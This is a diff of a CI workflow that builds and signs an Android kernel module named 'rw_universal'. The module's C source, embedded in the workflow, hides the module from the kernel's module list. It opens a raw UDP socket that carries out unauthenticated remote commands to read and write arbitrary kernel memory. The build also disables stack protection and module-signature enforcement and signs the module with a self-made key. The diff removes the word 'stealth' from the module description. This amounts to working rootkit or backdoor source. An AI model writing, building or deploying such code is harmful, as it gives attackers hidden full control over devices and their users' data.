@@ -1,5 +1,5 @@
 
-name: Build Signed LKM (5.10-android12) - FINAL FIXED
+name: Build Signed LKM (5.10-android12) - WORKING
 
 on:
   workflow_dispatch:
@@ -19,19 +19,19 @@ jobs:
           sudo apt-get update
           sudo apt-get install -y bc build-essential zip curl libssl-dev python3 git gcc-aarch64-linux-gnu
 
-      - name: Download Toolchain (Proton Clang)
+      - name: Download Toolchain
         run: |
           git clone --depth=1 https://github.com/kdrag0n/proton-clang clang
           rm clang/bin/ld
 
-      - name: Clone Kernel Source
+      - name: Clone Kernel
         run: |
           git clone --depth=1 https://android.googlesource.com/kernel/common \
             -b android12-5.10 kernel
 
-      - name: Overwrite Source Code
+      - name: Fix Source Code
         run: |
-          cat <<EOF > rw_universal.c
+          cat <<'EOF' > rw_universal.c
           // SPDX-License-Identifier: GPL-2.0
           #define pr_fmt(fmt) "rw_universal: " fmt
           #include <linux/init.h>
@@ -50,7 +50,7 @@ jobs:
 
           MODULE_LICENSE("GPL");
           MODULE_AUTHOR("x");
-          MODULE_DESCRIPTION("Universal stealth r/w for 5.10-android12+");
+          MODULE_DESCRIPTION("Universal r/w for 5.10");
 
           static unsigned long resolve_symbol(const char *name) {
               struct kprobe kp = { .symbol_name = name };
@@ -76,19 +76,20 @@ jobs:
               }
               return 0;
           }
+
           static const struct mm_walk_ops v2p_walk_ops = { .pte_entry = walker };
 
           static v2p_t slow_virt2phys(uint64_t vaddr) {
               v2p_t res = {0};
-              struct mm_walk walk = { .ops = &v2p_walk_ops, .private = &res };
-              walk_page_range(init_mm_ptr, vaddr, vaddr + 1, &walk, NULL);
+              walk_page_range(init_mm_ptr, vaddr, vaddr + 1, &v2p_walk_ops, &res);
               return res;
           }
 
           static int rw_phys(phys_addr_t phys, void *buf, size_t len, bool write) {
               void *vm = phys_to_virt(phys);
               if (!vm) return -EFAULT;
-              if (write) memcpy(vm, buf, len); else memcpy(buf, vm, len);
+              if (write) memcpy(vm, buf, len);
+              else memcpy(buf, vm, len);
               return 0;
           }
 
@@ -106,34 +107,45 @@ jobs:
               uint8_t reserved[3];
               uint32_t size;
               uint64_t addr;
-              uint8_t  data[];
+              uint8_t data[];
           } __packed pkt_t;
 
           static struct socket *sock = NULL;
 
           static void udp_reply(struct sk_buff *skb, void *buf, size_t len) {
-              struct iphdr *iph = ip_hdr(skb);
-              struct udphdr *uh = udp_hdr(skb);
+              struct iphdr *iph;
+              struct udphdr *uh;
               struct sockaddr_in to;
-              struct kvec iov = { .iov_base = buf, .iov_len = len };
+              struct kvec iov;
               struct msghdr msg;
+
+              iph = ip_hdr(skb);
+              uh = udp_hdr(skb);
+              
               memset(&to, 0, sizeof(to));
               to.sin_family = AF_INET;
-              to.sin_port   = uh->source;
+              to.sin_port = uh->source;
               to.sin_addr.s_addr = iph->saddr;
+
+              iov.iov_base = buf;
+              iov.iov_len = len;
+
               memset(&msg, 0, sizeof(msg));
               msg.msg_name = &to;
               msg.msg_namelen = sizeof(to);
+
               kernel_sendmsg(sock, &msg, &iov, 1, len);
           }
 
           static int udp_recv(struct sk_buff *skb) {
               pkt_t *pkt;
               uint8_t *buf;
+
               if (skb->len < sizeof(pkt_t)) return 0;
               pkt = (pkt_t *)skb->data;
               buf = kmalloc(pkt->size, GFP_KERNEL);
               if (!buf) return 0;
+
               switch (pkt->cmd) {
               case CMD_READ:
                   rw_virt(pkt->addr, buf, pkt->size, false);
@@ -146,86 +158,79 @@ jobs:
               kfree(buf);
               return 0;
           }
-          static int net_init(void) { return sock_create_kern(&init_net, AF_INET, SOCK_RAW, IPPROTO_UDP, &sock); }
-          static void net_exit(void) { if (sock) sock_release(sock); }
-          static void hide_module(void) { list_del_init(&THIS_MODULE->list); }
+
+          static int net_init(void) {
+              return sock_create_kern(&init_net, AF_INET, SOCK_RAW, IPPROTO_UDP, &sock);
+          }
+
+          static void net_exit(void) {
+              if (sock) sock_release(sock);
+          }
+
+          static void hide_module(void) {
+              list_del_init(&THIS_MODULE->list);
+          }
+
           static int __init rw_init(void) {
               _kallsyms_lookup_name = (void *)resolve_symbol("kallsyms_lookup_name");
-              init_mm_ptr           = (void *)resolve_symbol("init_mm");
+              init_mm_ptr = (void *)resolve_symbol("init_mm");
               if (!_kallsyms_lookup_name || !init_mm_ptr) return -ENODEV;
               hide_module();
               net_init();
               return 0;
           }
-          static void __exit rw_exit(void) { net_exit(); }
+
+          static void __exit rw_exit(void) {
+              net_exit();
+          }
+
           module_init(rw_init);
           module_exit(rw_exit);
           EOF
 
-      - name: Configure, Build & Sign
+      - name: Build
         run: |
           export PATH=$(pwd)/clang/bin:$PATH
           export ARCH=arm64
           export CROSS_COMPILE=aarch64-linux-gnu-
-          export CLANG_TRIPLE=aarch64-linux-gnu-
           
           cd kernel
           make mrproper
-          
           make HOSTCC=gcc HOSTCXX=g++ HOSTLD=ld CC=clang LLVM=1 LLVM_IAS=1 gki_defconfig
           
           sed -i 's/CONFIG_CC_STACKPROTECTOR_STRONG=y/# CONFIG_CC_STACKPROTECTOR_STRONG is not set/' .config
-          sed -i 's/CONFIG_CC_STACKPROTECTOR=y/# CONFIG_CC_STACKPROTECTOR is not set/' .config
           sed -i 's/CONFIG_MODULE_SIG=y/CONFIG_MODULE_SIG=n/' .config
-          sed -i 's/CONFIG_MODULE_SIG_ALL=y/CONFIG_MODULE_SIG_ALL=n/' .config
           
           make HOSTCC=gcc HOSTCXX=g++ HOSTLD=ld CC=clang LLVM=1 LLVM_IAS=1 olddefconfig
           make HOSTCC=gcc HOSTCXX=g++ HOSTLD=ld CC=clang LLVM=1 LLVM_IAS=1 modules_prepare
           cd ..
           
-          make -C $(pwd)/kernel \
-               M=$(pwd) \
-               ARCH=arm64 \
-               HOSTCC=gcc HOSTCXX=g++ HOSTLD=ld \
-               CC=clang \
-               LLVM=1 \
-               LLVM_IAS=1 \
+          make -C kernel M=$(pwd) ARCH=arm64 \
+               HOSTCC=gcc HOSTLD=ld CC=clang LLVM=1 LLVM_IAS=1 \
                CROSS_COMPILE=aarch64-linux-gnu- \
-               KCFLAGS="-Wno-declaration-after-statement -Wno-switch -Wno-error" \
-               modules
+               KCFLAGS="-Wno-error" modules
           
-          # --- Key Generation (Fixed Syntax) ---
-          cat <<EOF > x509.genkey
+          cat <<'EOFKEY' > x509.genkey
           [ req ]
           default_bits = 4096
           distinguished_name = req_distinguished_name
           prompt = no
-          string_mask = utf8only
           x509_extensions = myexts
-
           [ req_distinguished_name ]
-          CN = Android Kernel Module
-
+          CN = Module
           [ myexts ]
           basicConstraints=critical,CA:FALSE
           keyUsage=digitalSignature
-          subjectKeyIdentifier=hash
-          authorityKeyIdentifier=keyid
-          EOF
+          EOFKEY
           
           openssl req -new -nodes -utf8 -sha256 -days 36500 -batch -x509 \
-            -config x509.genkey \
-            -outform DER -out signing_key.x509 \
-            -keyout signing_key.pem
-            
-          echo "Building sign-file..."
-          make -C kernel/scripts sign-file HOSTCC=gcc HOSTLD=ld
+            -config x509.genkey -outform DER -out key.x509 -keyout key.pem
           
-          echo "Signing Module..."
-          ./kernel/scripts/sign-file sha256 signing_key.pem signing_key.x509 rw_universal.ko
+          make -C kernel/scripts sign-file HOSTCC=gcc HOSTLD=ld
+          kernel/scripts/sign-file sha256 key.pem key.x509 rw_universal.ko
 
-      - name: Upload Artifact
+      - name: Upload
         uses: actions/upload-artifact@v4
         with:
-          name: rw_universal-signed.ko
+          name: rw_universal.ko
           path: rw_universal.ko
